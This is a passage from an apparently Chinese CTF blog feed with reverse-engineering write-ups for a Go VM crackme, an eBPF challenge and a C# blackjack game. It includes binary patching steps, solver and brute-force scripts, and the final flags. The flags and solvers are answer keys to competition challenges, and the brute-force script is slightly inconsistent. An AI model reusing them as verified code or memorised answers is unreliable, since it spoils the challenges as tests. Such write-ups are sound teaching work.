class="hljs-number">0x0000005C</span>, <span class="hljs-number">0x0000005A</span>, <span class="hljs-number">0x00000044</span>, <span class="hljs-number">0x00000058</span>, <span class="hljs-number">0x00000055</span>, <span class="hljs-number">0x0000006E</span>, <span class="hljs-number">0x0000005A</span>, <span class="hljs-number">0x0000005A</span>, <span class="hljs-number">0x00000045</span>, <span class="hljs-number">0x0000006B</span>, <span class="hljs-number">0x00000053</span>, <span class="hljs-number">0x00000054</span>, <span class="hljs-number">0x0000006B</span>, <span class="hljs-number">0x0000005D</span>, <span class="hljs-number">0x00000054</span>, <span class="hljs-number">0x00000046</span>, <span class="hljs-number">0x00000054</span>, <span class="hljs-number">0x00000010</span>, <span class="hljs-number">0x00000015</span>, <span class="hljs-number">0x00000014</span>, <span class="hljs-number">0x0000006E</span>, <span class="hljs-number">0x00000063</span>, <span class="hljs-number">0x00000059</span>, <span class="hljs-number">0x0000005E</span>, <span class="hljs-number">0x0000006B</span>, <span class="hljs-number">0x00000054</span>, <span class="hljs-number">0x00000043</span>, <span class="hljs-number">0x00000051</span>, <span class="hljs-number">0x0000006E</span>, <span class="hljs-number">0x00000064</span>, <span class="hljs-number">0x0000000B</span>, <span class="hljs-number">0x00000014</span>, <span class="hljs-number">0x00000010</span>, <span class="hljs-number">0x00000049</span>]<br>flag = [<span class="hljs-number">0</span>]*<span class="hljs-number">42</span><br>xor_data = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">42</span>):<br>    flag[i] = s[i]^xor_data<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(flag[i]),end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">if</span> (i+<span class="hljs-number">1</span>) % <span class="hljs-number">6</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> (i+<span class="hljs-number">1</span>) % <span class="hljs-number">6</span> == <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> (i+<span class="hljs-number">1</span>) % <span class="hljs-number">6</span> == <span class="hljs-number">4</span> :<br>        xor_data = <span class="hljs-number">49</span><br>    <span class="hljs-keyword">if</span> (i+<span class="hljs-number">1</span>) % <span class="hljs-number">6</span> == <span class="hljs-number">2</span> <span class="hljs-keyword">or</span> (i+<span class="hljs-number">1</span>) % <span class="hljs-number">6</span> == <span class="hljs-number">5</span> :<br>        xor_data = <span class="hljs-number">52</span><br>    <span class="hljs-keyword">if</span> (i+<span class="hljs-number">1</span>) % <span class="hljs-number">6</span> == <span class="hljs-number">3</span> :<br>        xor_data = <span class="hljs-number">53</span><br><br><span class="hljs-comment"># Rnss&#123;U_should_not_be_here!!!_Who_are_U?!!&#125;</span><br></code></pre></td></tr></table></figure><p>程序处有一个小坑，第一次的异或值是<code>'v'</code>，关于这个好像可以通过交叉引用进行查找？反正问题不大(<code>flag</code>头都反正已知)</p><p>至此程序的逆向工作就完成了，希望能对各位师傅们有所帮助。</p>]]></content>
    
    
    <categories>
      
      <category>Reverse</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2022全国大学生信息安全竞赛决赛 Re —— analgo</title>
    <link href="/2022/08/11/2022%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9B%20Re%20%E2%80%94%E2%80%94%20analgo/"/>
    <url>/2022/08/11/2022%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9B%20Re%20%E2%80%94%E2%80%94%20analgo/</url>
    
    <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>本来想练习一下<code>Go</code>的有关题目的，不知不觉就找到了这个…被硬生生暴打，坐牢几天后想到为什么不可以直接使用爆破反正也就<code>42</code>位<code>flag</code>，最坏的情况下也就是<code>98的42次方</code>(不会真的有人打开输入关闭去这样爆破吧…)，简单的找了点参考，发现和今年还是去年的一个<code>hgame</code>的题目有点相似，<code>hgame</code>的那个题目叫<code>hardasm</code>，看官方的<code>wp</code>看的头大…但是校外的一个师傅给出了<code>subprocess</code>进行爆破的一种方法，相当于用<code>python</code>模拟我们输入并获取结果…网上没找到太多的关于这个的资料，于是只好对着校外师傅的脚本简单改改</p><h2 id="简单分析">简单分析</h2><p>刚拿到题目，光是看名字似乎就知道是分析<code>Go</code>了，建议使用<code>IDA 7.6</code>及以上的<code>IDA</code>进行反编译，<code>GO</code>的主函数与我们常接触到的<code>C/C++</code>不太一样，有一些奇妙的特性，像是主函数是<code>main_mian</code>，传入字符串时是一个结构体，结构体里面是一个指针和一个<code>int</code>类型的字符串长度，也因为这些奇妙的特性导致<code>GO</code>逆向向来不太好进行</p><h2 id="输入字符串">输入字符串</h2><p><img src="https://s2.loli.net/2022/08/11/FmxzaROvT52IJSk.png" alt="1.png"></p><p>找到<code>main_main</code>,就可以推断出来我们需要输入的长度</p><h2 id="加密部分">加密部分</h2><p><img src="https://s2.loli.net/2022/08/11/sKTtodl6Y7LUHgV.png" alt="2.png"></p><p>可以看到程序使用一个<code>qmemcpy</code>将对应的<code>opcode</code>赋值给了<code>v27</code>，同时下面启动<code>main_anal</code>函数，不难猜测出其就是我们的主要加密部分，进入该函数可以看到多个<code>if</code>块，一会<code>if</code>这个<code>if</code>那个同时还有<code>v10</code>这些控制<code>if</code>块是否执行，整个虚拟机运行部分十分混杂，特别难看(也有可能是我太菜了)</p><p><img src="https://s2.loli.net/2022/08/11/3dgOzvHDItWFypN.png" alt="3.png"></p><p>对此我们结合之前所提到的<code>subprocess</code>想是否我们可以直接对每一位进行爆破？因为程序下面有对应的比较语句，我们是否能像<code>hgame</code>的程序一样将对应的程序部分<code>patch</code>，将我们加密后的数据输出，然后与正确的进行比较，当输出正确一个时会对应上一个加密后的数据，通过这个方式进行有目的性的爆破处理</p><h2 id="爆破测试">爆破测试</h2><p>我们可以多次进行尝试输入，因为<code>flag</code>头可以确定是<code>flag&#123;&#125;</code>，长度要求为<code>42</code>，多次的调试进行测试下来我们可以发现一个规律，程序将我们的输入进行两两加密</p><p><img src="https://s2.loli.net/2022/08/11/odtL8nK92i7xumz.png" alt="4.png"></p><p>在发现上述规律后我们便要开始尝试进行<code>patch</code>对应的输出</p><h2 id="修改程序">修改程序</h2><p><img src="https://s2.loli.net/2022/08/11/otMfJbkvBQuPOlE.png" alt="5.png"></p><p>我们观察到输出是用<code>lea</code>将对应的偏移地址进行保存到<code>rdx</code>，我们需要做的便是修改对应的<code>off_XXX</code>处内的值，起初打算是将这个换成一个寄存器，因为我们可以通过调试发现加密后的输入保存在某一个寄存器上，修改了半天<code>Keypatch</code>崩了，带着<code>IDA</code>一起走了…要么就是<code>Keypatch</code>总是自己将我们改的一个地址修改到另一个地址，好奇怪？</p><p>最后我们将目标锁定在了比较的过程中，因为比较中肯定会同时出现<code>flag</code>加密后的数据和我们输入加密后的数据，在这个地方我们也可以尝试将对应的输入加密保存到一个固定的位置</p><p>在之前的<code>if</code>块中，我们可以发现比较的函数是<code>runtime_memequal()</code>我们进入函数进行查找对应的比较部分在哪里，最后可以锁定在一个<code>if</code>块上</p><p><img src="https://s2.loli.net/2022/08/11/83Fd7y6R1uerqGW.png" alt="6.png"></p><p>切换到对应的汇编</p><p><img src="https://s2.loli.net/2022/08/11/ArTcYFbBCMimkEJ.png" alt="7.png"></p><p>我们将其进行修改后为：</p><p><img src="https://s2.loli.net/2022/08/11/9qgaXStbYjUE6ou.png" alt="8.png"></p><p>需要注意的是<code>Wrong！</code>字符串是保存在<code>.rdata</code>段上的，需要注意一下其是否可写，将对应的段的权限进行修改</p><p><img src="https://s2.loli.net/2022/08/11/fF4R6B7zIkjiYbX.png" alt="10.png"></p><p>修改完毕后我们进行简单的测试一下看看能不能完成输入</p><p><img src="https://s2.loli.net/2022/08/11/mDNqnovrMCZj1Xp.png" alt="11.png"></p><p>可以发现可以将我们的输入加密后进行输出后我们可以开始写对应的爆破脚本了</p><h2 id="编写脚本">编写脚本</h2><p>此处借用<code>hgame</code>比赛时外校师傅使用的脚本进行魔改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> subprocess<br><br>real_flag=<span class="hljs-string">&quot;flag&#123;&quot;</span>   <span class="hljs-comment">#绝对正确的前5个字符</span><br>cur_index=<span class="hljs-built_in">len</span>(real_flag)     <span class="hljs-comment">#当前爆破的位置</span><br>k = <span class="hljs-number">0</span><br>s = <span class="hljs-string">&quot;0123465789abcdef-&quot;</span> <span class="hljs-comment"># 限制的输入范围</span><br>s = <span class="hljs-built_in">list</span>(s)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s)):<br>    s[i] = <span class="hljs-built_in">ord</span>(s[i])<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">v19 = 0x9F061721E8B3DD38LL; # 加密后的flag</span><br><span class="hljs-string">v20 = 0x120D94C88B56A209LL;</span><br><span class="hljs-string">v21 = 0x8C0C2D3877E67EF3LL;</span><br><span class="hljs-string">v22 = 0x2507BAF4CF113DELL;</span><br><span class="hljs-string">v23 = 0x1B66F9F5A0238BCALL;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>ans1 = [<span class="hljs-number">0x38</span>,<span class="hljs-number">0xdd</span>,<span class="hljs-number">0xb3</span>,<span class="hljs-number">0xe8</span>,<span class="hljs-number">0x21</span>,<span class="hljs-number">0x17</span>,<span class="hljs-number">0x06</span>,<span class="hljs-number">0x9f</span>]<br>ans2 = [<span class="hljs-number">0x09</span>,<span class="hljs-number">0xa2</span>,<span class="hljs-number">0x56</span>,<span class="hljs-number">0x8b</span>,<span class="hljs-number">0xc8</span>,<span class="hljs-number">0x94</span>,<span class="hljs-number">0x0d</span>,<span class="hljs-number">0x12</span>]<br>ans3 = [<span class="hljs-number">0xf3</span>,<span class="hljs-number">0x7e</span>,<span class="hljs-number">0xe6</span>,<span class="hljs-number">0x77</span>,<span class="hljs-number">0x38</span>,<span class="hljs-number">0x2d</span>,<span class="hljs-number">0x0c</span>,<span class="hljs-number">0x8c</span>]<br>ans4 = [<span class="hljs-number">0xde</span>,<span class="hljs-number">0x13</span>,<span class="hljs-number">0xf1</span>,<span class="hljs-number">0x4c</span>,<span class="hljs-number">0xaf</span>,<span class="hljs-number">0x7b</span>,<span class="hljs-number">0x50</span>,<span class="hljs-number">0x02</span>]<br>ans5 = [<span class="hljs-number">0xca</span>,<span class="hljs-number">0x8b</span>,<span class="hljs-number">0x23</span>,<span class="hljs-number">0xa0</span>,<span class="hljs-number">0xf5</span>,<span class="hljs-number">0xf9</span>,<span class="hljs-number">0x66</span>,<span class="hljs-number">0x1b</span>]<br><br><span class="hljs-keyword">while</span> cur_index &lt; <span class="hljs-number">42</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<span class="hljs-comment">#当前爆破的位置上的字符</span><br>        real_flag_arr = [<span class="hljs-number">0</span>] * <span class="hljs-number">42</span><br><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(real_flag)):<span class="hljs-comment">#正确的先复制一下</span><br>            real_flag_arr[j]=<span class="hljs-built_in">ord</span>(real_flag[j])<br><br>        real_flag_arr[<span class="hljs-built_in">len</span>(real_flag_arr)-<span class="hljs-number">1</span>]=<span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;&#125;&quot;</span>)<span class="hljs-comment">#最后一个字符&quot;&#125;&quot;固定</span><br><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(real_flag_arr)-<span class="hljs-number">2</span>,cur_index,-<span class="hljs-number">1</span>):<span class="hljs-comment">#除了当前爆破的位置，其他位置上都设置为32</span><br>            real_flag_arr[j]=<span class="hljs-number">48</span><br><br>        real_flag_arr[cur_index]=i <span class="hljs-comment">#设置当前爆破的位置上的字符</span><br>        real_flag_arr_s=<span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">chr</span>(k) <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> real_flag_arr) <span class="hljs-comment">#输入到程序中的字符串</span><br>        p = subprocess.Popen([<span class="hljs-string">&quot;C:\\Users\\Equinox\\Desktop\\analgo.exe&quot;</span>],stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)<br>        p.stdin.write(real_flag_arr_s.encode())<br>        p.stdin.close()<br>        out = p.stdout.read()<br>        out = <span class="hljs-built_in">list</span>(out)<br><br>        <span class="hljs-keyword">if</span> out[k] == ans[k]:<span class="hljs-comment">#判断程序打印出的0xFF的个数是否增加，增加则说明当前爆破的位置上的字符设置的是正确的</span><br>            real_flag += <span class="hljs-built_in">chr</span>(i)<br>            cur_index += <span class="hljs-number">1</span><br>            k += <span class="hljs-number">1</span><br>            <span class="hljs-built_in">print</span>(real_flag)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>因为前面提到的<code>Wrong!</code>处的字符串似乎只能存储<code>8</code>个字节，因此我们需要每次爆破出来后将源程序继续进行<code>patch</code>，将对应的<code>rsi+8</code>，同时改变脚本中的<code>ans</code>最后即可爆破出<code>flag</code></p><h2 id="flag">flag</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">568</span>a<span class="hljs-number">3</span>cdd-<span class="hljs-number">77</span>e<span class="hljs-number">1</span>-<span class="hljs-number">4</span>c<span class="hljs-number">42</span>-<span class="hljs-number">9</span>fee-<span class="hljs-number">127</span>e<span class="hljs-number">27</span>a<span class="hljs-number">5744</span>e&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Reverse</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2022 虎符逆向FBPE复现</title>
    <link href="/2022/08/08/2022%20%E8%99%8E%E7%AC%A6%E9%80%86%E5%90%91FBPE%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/08/08/2022%20%E8%99%8E%E7%AC%A6%E9%80%86%E5%90%91FBPE%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>拿到程序拖入<code>PE</code>可以发现是一个64位程序，拖入<code>IDA</code>中反编译出来我们可以明显看到有一个<code>BPF program</code>的提示信息</p><p><img src="https://s2.loli.net/2022/08/08/pwaYJCDZbhTq9RB.png" alt="1.png"></p><p>BPF就是实现了一个内核虚拟机，也是ELF格式，通常以<strong>文件形式</strong>存在或<strong>内联编译</strong>进程序</p><p><img src="https://ppppz.net/2022/03/25/HFCTF2022-fpbe/image-20220325105052222.png" alt="image-20220325105052222"></p><p>参考文章：</p><blockquote><p><a href="http://blog.leanote.com/post/xp0int/2022-%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8">http://blog.leanote.com/post/xp0int/2022-虎符网络安全</a></p><p><a href="https://blog.csdn.net/pwl999/article/details/82884882">https://blog.csdn.net/pwl999/article/details/82884882</a></p></blockquote><p>所以此题的关键就是内联编译的BPF程序</p><p>调用顺序：<code>fpbe_bpf__open_and_load -&gt; fpbe_bpf__open -&gt; fpbe_bpf__open_opts -&gt; fpbe_bpf__create_skeleton</code></p><p><img src="https://s2.loli.net/2022/08/08/B4ldIfCornDAX62.png" alt="2.png"></p><p>我们可以直接手动进行<code>dump</code>下来进行观察该程序内联的一个程序信息，通过一个<code>Github</code>开源的项目，我们可以将其反编译为汇编形式</p><p><code>Github</code>项目链接：</p><blockquote><p><a href="https://github.com/cylance/eBPF_processor">https://github.com/cylance/eBPF_processor</a></p></blockquote><p>之后将程序选择解析为<code>ebpf</code></p><p><img src="https://s2.loli.net/2022/08/08/RedojNXb4aH7QzL.png" alt="3.png"></p><p>之后可以反编译得到对应的汇编语句</p><p><img src="https://s2.loli.net/2022/08/08/LheZJAGjwrpdvUf.png" alt="4.png"></p><p>在<code>ida</code>中似乎并不能转换为对应的<code>伪C代码</code>，但是我们可以使用<code>llvm-objdump</code>让其看起来更好看一些</p><p><img src="https://s2.loli.net/2022/08/08/OFU5QsAMgwpZG2k.png" alt="5.png"></p><p>经过翻译可以得到是一个大数约束求解的一个过程，写出对应<code>z3</code>脚本进行约束求解即可</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>r1 = Int(<span class="hljs-string">&#x27;r1&#x27;</span>)<br>r2 = Int(<span class="hljs-string">&#x27;r2&#x27;</span>)<br>r3 = Int(<span class="hljs-string">&#x27;r3&#x27;</span>)<br>r4 = Int(<span class="hljs-string">&#x27;r4&#x27;</span>)<br>s = Solver()<br><br>s.add(<span class="hljs-number">28096</span>*r1+<span class="hljs-number">64392</span>*r2+<span class="hljs-number">29179</span>*r3+<span class="hljs-number">52366</span>*r4 == <span class="hljs-number">209012997183893</span>)<br>s.add(<span class="hljs-number">61887</span>*r1+<span class="hljs-number">27365</span>*r2+<span class="hljs-number">44499</span>*r3+<span class="hljs-number">37508</span>*r4 == <span class="hljs-number">181792633258816</span>)<br>s.add(<span class="hljs-number">56709</span>*r1+<span class="hljs-number">32808</span>*r2+<span class="hljs-number">25901</span>*r3+<span class="hljs-number">59154</span>*r4 == <span class="hljs-number">183564558159267</span>)<br>s.add(<span class="hljs-number">33324</span>*r1+<span class="hljs-number">51779</span>*r2+<span class="hljs-number">31886</span>*r3+<span class="hljs-number">62010</span>*r4 == <span class="hljs-number">204080879923831</span>)<br><br><span class="hljs-keyword">if</span> s.check() == sat:<br>flag = <span class="hljs-string">b&quot;&quot;</span><br>m = s.model()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [r1, r2, r3, r4]:<br>flag += long_to_bytes(m[i].as_long())[::-<span class="hljs-number">1</span>]<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment"># HFCTF&#123;0vR3sAlbs8pD2h53&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Reverse</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2022 强网逆向部分题解</title>
    <link href="/2022/08/06/2022%20%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%80%86%E5%90%91%E5%A4%8D%E7%8E%B0(%E9%83%A8%E5%88%86)/"/>
    <url>/2022/08/06/2022%20%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%80%86%E5%90%91%E5%A4%8D%E7%8E%B0(%E9%83%A8%E5%88%86)/</url>
    
    <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>整个比赛打下来就只有坐牢、坐牢还是坐牢…萌新逆向选手拿到的都是一堆<code>ELF</code>然后进行着一堆奇怪的函数…完全看不懂…或许只有<code>GameMaster</code>算是我能看懂的题目吧…</p><h2 id="GAME-MASTER">GAME MASTER</h2><p>感觉整场比赛下来的逆向签到题目，本质上是一个<code>C#</code>编写的一个<code>21点</code>游戏，因为看不懂<code>C#</code>只能连蒙带猜的看，毕竟和<code>C</code>还是长得有些相似，还算好理解…</p><p>我们将其拖入到<code>PE</code>中进行查看</p><p><img src="https://s2.loli.net/2022/08/05/DbzqQuGCViXoRM5.png" alt="1.png"></p><p>可以很明显的发现是一个<code>C#</code>文件，使用<code>dnSpy(32位)</code>进行打开，直接可以找到关键的主函数</p><img src="https://s2.loli.net/2022/08/05/kgCrMAdYGOBh3F8.png" alt="2.png" style="zoom: 67%;" /><p>可以很明显的发现程序加载了附件中的<code>game message</code>，我们往下翻可以发现下面这些特殊操作：</p><img src="https://s2.loli.net/2022/08/05/pn7hteTDEBK2CQI.png" alt="6.png" style="zoom:80%;" /><p>程序中似乎可以输入作弊码，同时在<code>goldFunc</code>中我们可以看到每一种作弊码对应的效果，有加钱的有减赌注的…同时我们也发现了几个有点不一样的作弊码，他们对我们之前加载的<code>game message</code>进行了操作，如下图：</p><p><img src="https://s2.loli.net/2022/08/05/z67MLt8aVpsTobR.png" alt="3.png"></p><img src="https://s2.loli.net/2022/08/05/kaCo5rQHNIJFtuh.png" alt="4.png" style="zoom: 80%;" /><p><img src="https://s2.loli.net/2022/08/05/qCO4j87X6fLg1sA.png" alt="5.png"></p><p>大致可以看出来程序将<code>game message</code>进行了异或以及<code>AES ECB</code>的解密，对此我们尝试输入对应的作弊码，发现<code>game message</code>没有什么变化…不知道是不是因为程序没有将写完后的数据关闭，而导致数据仍然停留在内存中，我也看不懂<code>C#</code>，也不是很清楚…</p><blockquote><p>尝试输入作弊码的师傅可能需要注意一下，第一个大的前缀作弊码输入完后需要再输入一位字符(可以随意输入)，之后再进行输入第二段作弊码</p></blockquote><p>对此我们采取手动进行解密<code>game message</code>的信息，写出如下<code>Python</code>脚本</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> operator <span class="hljs-keyword">import</span> imod<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br>data = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./gamemessage&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>).read()<br>data = <span class="hljs-built_in">list</span>(data)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):<br>    data[i] ^= <span class="hljs-number">34</span><br><br>key = [<span class="hljs-number">66</span>,<span class="hljs-number">114</span>,<span class="hljs-number">97</span>,<span class="hljs-number">105</span>,<span class="hljs-number">110</span>,<span class="hljs-number">115</span>,<span class="hljs-number">116</span>,<span class="hljs-number">111</span>,<span class="hljs-number">114</span>,<span class="hljs-number">109</span>,<span class="hljs-number">105</span>,<span class="hljs-number">110</span>,<span class="hljs-number">103</span>,<span class="hljs-number">33</span>,<span class="hljs-number">33</span>,<span class="hljs-number">33</span>]<br>aes = AES.new(<span class="hljs-built_in">bytes</span>(key),AES.MODE_ECB)<br>de_data = aes.decrypt(<span class="hljs-built_in">bytes</span>(data))<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;decode&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(de_data)<br><br>f.close()<br></code></pre></td></tr></table></figure><p>之后我们可以将我们的<code>game message</code>拖入到<code>010</code>中进行查看，可以发现整个文件是一个<code>PE</code>文件加上了一堆奇怪的东西</p><img src="https://s2.loli.net/2022/08/05/kiACqYh1xzS7KVQ.png" alt="7.png" style="zoom: 67%;" /><p>之后我们可以恢复得到一个<code>exe</code>，将其拖入<code>PE</code>，同样发现其是一个<code>C#</code>文件，我们同样直接拖入到<code>dnSpy</code>进行分析查看</p><img src="https://s2.loli.net/2022/08/05/LW8x795VqOhitbs.png" alt="8.png" style="zoom: 67%;" /><p>我们可以发现其中的主要关键为其中的<code>Check1</code>整个函数，在其中我们缺少对应的<code>x</code>、<code>y</code>、<code>z</code>，如果我们采用手逆的话可能会有些麻烦，我们可以直接利用<code>Z3</code>对其进行约束求解，将解密得到的<code>x</code>、<code>y</code>、<code>z</code>直接应用到下面，按程序逻辑进行执行即可得到对应题目的<code>flag</code>，写出脚本如下：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> im<br><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>s = Solver()<br>enc = [<span class="hljs-number">101</span>, <span class="hljs-number">5</span>, <span class="hljs-number">80</span>, <span class="hljs-number">213</span>, <span class="hljs-number">163</span>, <span class="hljs-number">26</span>, <span class="hljs-number">59</span>, <span class="hljs-number">38</span>, <span class="hljs-number">19</span>, <span class="hljs-number">6</span>, <span class="hljs-number">173</span>, <span class="hljs-number">189</span>, <span class="hljs-number">198</span>, <span class="hljs-number">166</span>, <span class="hljs-number">140</span>, <span class="hljs-number">183</span>, <span class="hljs-number">42</span>, <span class="hljs-number">247</span>, <span class="hljs-number">223</span>,<br>       <span class="hljs-number">24</span>, <span class="hljs-number">106</span>, <span class="hljs-number">20</span>, <span class="hljs-number">145</span>, <span class="hljs-number">37</span>, <span class="hljs-number">24</span>, <span class="hljs-number">7</span>, <span class="hljs-number">22</span>, <span class="hljs-number">191</span>, <span class="hljs-number">110</span>, <span class="hljs-number">179</span>, <span class="hljs-number">227</span>, <span class="hljs-number">5</span>, <span class="hljs-number">62</span>, <span class="hljs-number">9</span>, <span class="hljs-number">13</span>, <span class="hljs-number">17</span>, <span class="hljs-number">65</span>, <span class="hljs-number">22</span>, <span class="hljs-number">37</span>, <span class="hljs-number">5</span>]<br>x = BitVec(<span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-number">64</span>)<br>y = BitVec(<span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-number">64</span>)<br>z = BitVec(<span class="hljs-string">&#x27;z&#x27;</span>, <span class="hljs-number">64</span>)<br>key = [<span class="hljs-number">0</span>]*<span class="hljs-number">40</span><br>num = -<span class="hljs-number">1</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">320</span>):<br>    x = (((x &gt;&gt; <span class="hljs-number">29</span> ^ x &gt;&gt; <span class="hljs-number">28</span> ^ x &gt;&gt; <span class="hljs-number">25</span> ^ x &gt;&gt; <span class="hljs-number">23</span>) &amp; <span class="hljs-number">1</span>) | x &lt;&lt; <span class="hljs-number">1</span>)<br>    y = (((y &gt;&gt; <span class="hljs-number">30</span> ^ y &gt;&gt; <span class="hljs-number">27</span>) &amp; <span class="hljs-number">1</span>) | y &lt;&lt; <span class="hljs-number">1</span>)<br>    z = (((z &gt;&gt; <span class="hljs-number">31</span> ^ z &gt;&gt; <span class="hljs-number">30</span> ^ z &gt;&gt; <span class="hljs-number">29</span> ^ z &gt;&gt; <span class="hljs-number">28</span> ^ z &gt;&gt; <span class="hljs-number">26</span> ^ z &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">1</span>) | z &lt;&lt; <span class="hljs-number">1</span>)<br><br>    <span class="hljs-keyword">if</span> i % <span 